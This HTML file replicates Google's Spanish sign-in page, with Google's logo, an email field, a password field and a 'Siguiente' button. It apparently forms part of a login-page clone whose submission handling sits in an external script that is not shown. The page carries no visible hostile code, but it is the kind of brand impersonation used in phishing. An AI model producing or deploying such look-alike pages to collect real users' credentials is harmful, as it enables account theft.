<!doctype html>
<html lang="es"> 
 <head> 
  <meta charset="UTF-8"> 
  <meta name="viewport" content="width=device-width, initial-scale=1.0"> 
  <title>Iniciar sesión - Google</title> 
  <link rel="stylesheet" href="styles.css"> 
 </head> 
 <body> 
  <div class="login-container"> 
   <div class="login-box"> 
    <img src="https://ssl.gstatic.com/accounts/ui/logo_2x.png" alt="Google logo" class="logo"> 
    <h1 class="title">Inicia sesión</h1> 
    <form id="login-form"> 
     <div class="input-group"> 
      <input type="email" id="email" name="email" required> <label for="email">Correo electrónico o teléfono</label> 
     </div> 
     <div class="input-group"> 
      <input type="password" id="password" name="password" required> <label for="password">Contraseña</label> 
     </div> 
     <div class="buttons"> <button type="submit" class="next-button">Siguiente</button> 
     </div> 
    </form> 
    <div class="links"> 
     <div class="forgot-password"> <a href="#" class="forgot-email">¿Has olvidado el correo electrónico?</a> 
     </div> 
     <div class="create-account"> <a href="#">Crear cuenta</a> 
     </div> 
    </div> 
   </div> 
  </div> 
  <script src="script.js"></script>  
 
</body></html>
